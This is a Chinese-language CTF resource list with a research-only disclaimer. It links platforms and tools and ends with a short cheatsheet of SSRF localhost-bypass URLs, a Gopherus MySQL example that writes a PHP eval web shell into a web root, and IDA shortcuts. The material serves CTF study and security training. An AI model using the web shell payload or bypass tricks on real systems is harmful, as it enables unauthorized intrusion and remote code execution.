# Awesome-CTF
**【免责声明】本仓库所涉及的技术、思路和工具仅供安全技术研究，任何人不得将其用于非授权渗透测试，不得将其用于非法用途和盈利，否则后果自行承担。**

## CTF平台

- CTF Wiki：https://ctf-wiki.org/
- CTF Time：https://ctftime.org/
- 攻防世界：https://adworld.xctf.org.cn/
- Hacker 101：https://www.hacker101.com/
- Cryptopals：密码学练习题目 https://cryptopals.com/

## CTF工具

### 综合工具

- CTF Tools：https://github.com/zardus/ctf-tools

### Crypto

- CyberChef：综合编解码及加密，可本地部署 https://github.com/gchq/CyberChef
- OK Tools在线工具：https://github.com/wangyiwy/oktools
- CTF在线工具：http://www.hiencode.com/
- XSSEE：在线综合编解码 https://evilcos.me/lab/xssee/
- MeTools：在线综合编解码 http://www.metools.info/code/quotedprintable231.html

- MD5 Hash：https://www.somd5.com/
- GB2312：http://code.mcdvisa.com/
- Unicode字符表：https://www.52unicode.com/enclosed-alphanumerics-zifu
- Unicode：https://www.compart.com/en/unicode/
- UUencode：http://web.chacuo.net/charsetuuencode
- Escape/Unescape：https://tool.chinaz.com/tools/escape.aspx
- HTML实体编码：https://zh.rakko.tools/tools/21/
- 摩斯电码：http://moersima.00cha.net/
- 摩斯电码：http://www.zhongguosou.com/zonghe/moersicodeconverter.aspx
- 栅栏密码：https://www.qqxiuzi.cn/bianma/zhalanmima.php
- 猪圈密码：http://www.hiencode.com/pigpen.html
- 零宽字符：http://330k.github.io/misc_tools/unicode_steganography.html

### Misc

- Binwalk：https://github.com/ReFirmLabs/binwalk
- Stegsolve：图片隐写 http://www.caesum.com/handbook/stego.htm
- Audacity：音频隐写 https://www.audacityteam.org/
- 图虫EXIF查看器：https://exif.tuchong.com/
- 盲水印提取：https://github.com/chishaxie/BlindWaterMark

### Web

- localhost绕过：127.0.0.1  >>> 2130706433 https://www.browserling.com/tools/ip-to-dec

### Pwn

- Pwntools：https://github.com/Gallopsled/pwntools

### Reverse

- ExEinfo PE：查看PE文件信息 

- Cutter：https://cutter.re/
- IDA：https://hex-rays.com/ida-pro/
- Ollydbg：https://www.ollydbg.de/
- angr：二进制分析 https://github.com/angr/angr

## Cheatsheet

### Web

#### localhost绕过

```
http://127.0.0.1:80
http://localhost:22
http://[::]:80/  >>>  http://127.0.0.1
http://example.com@127.0.0.1
http://127.0.0.1.xip.io/
http://127。0。0。1  >>>  http://127.0.0.1
http://0/

# 十六进制、八进制转换
http://127.0.0.1  >>>  http://0177.0.0.1/

# 转换为小数 https://www.browserling.com/tools/ip-to-dec
http://127.0.0.1  >>>  http://2130706433/
```

#### Gopherus

```
# mysql
> python2 gopherus.py --exploit mysql
---------------------------------------------
Give MySQL username: root
Give query to execute: select "<?php phpinfo();?>" into outfile "/var/www/html/gopher.php"
```

```
select "<?php @eval($_POST[c]);?>" into outfile "/var/www/html/gopher.php"
```

### Reverse

#### IDA快捷键

##### 切换文本视图与图表视图

```
空格键
```

##### 返回上一个操作地址

```
ESC
```

##### 搜索地址和符号

```
G
```

##### 对符号进行重命名

```
N
```

##### 常规注释

```
冒号
```

##### 可重复注释

```
分号
```

##### 添加标签

```
Alt+M
```

##### 查看标签

```
Ctrl+M
```

##### 查看段的信息

```
Ctrl+S
```

##### 查看交叉应用

```
X
```

##### 查看伪代码

```
F5
```

##### 搜索文本

```
Alt+T
```

##### 搜索十六进制

```
Alt+B
```



